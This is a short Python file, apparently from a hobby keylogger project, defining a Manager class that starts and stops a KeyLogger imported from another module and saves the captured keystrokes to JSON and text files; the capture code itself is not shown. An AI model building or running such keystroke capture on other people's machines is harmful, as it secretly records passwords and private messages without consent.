import time

from listener import KeyLogger
from write_to_file import WriteToFile

class Manager:
    def __init__(self):
        self.recorde = KeyLogger()
        self.data = WriteToFile()


    def start_recording(self):
        self.recorde.start_listen()

    def stop_recording(self):
        self.recorde.stop_listen()
        self.data.data = self.recorde.get_logs()

    def write_json_file(self):
        self.data.data = self.recorde.get_logs()
        self.data.write_to_json_file()
        self.data.write_to_file()



if __name__ == '__main__':
    n = Manager()
    n.start_recording()
    n.write_json_file()










